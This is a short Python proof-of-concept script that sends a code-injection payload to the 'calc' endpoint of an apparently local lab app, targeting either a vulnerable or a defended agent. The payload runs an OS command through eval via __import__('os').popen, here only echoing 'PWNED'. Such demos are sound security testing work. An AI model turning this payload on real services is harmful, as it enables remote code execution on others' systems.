import argparse, requests

BASE_VULN = "http://127.0.0.1:5001"
BASE_DEF  = "http://127.0.0.1:5002"


# --- CLI arguments ---
parser = argparse.ArgumentParser()
parser.add_argument("--url", help="Target calc endpoint URL (overrides defaults)")
parser.add_argument("--defended", action="store_true", help="Target defended agent instead of vulnerable")
args = parser.parse_args()

# --- Defaults ---
if args.url:
    target_url = f"{args.url}/calc"
elif args.defended:
    target_url = f"{BASE_DEF}/calc"
else:
    target_url = f"{BASE_VULN}/calc"

# Attempt to run an OS command via eval. This should work only on the vulnerable app.
#url = "http://127.0.0.1:5001/calc"
payload = {"expr": "__import__('os').popen('echo PWNED').read()"}
r = requests.get(target_url, params=payload, timeout=5)
print("Status:", r.status_code, "Body:", r.text)
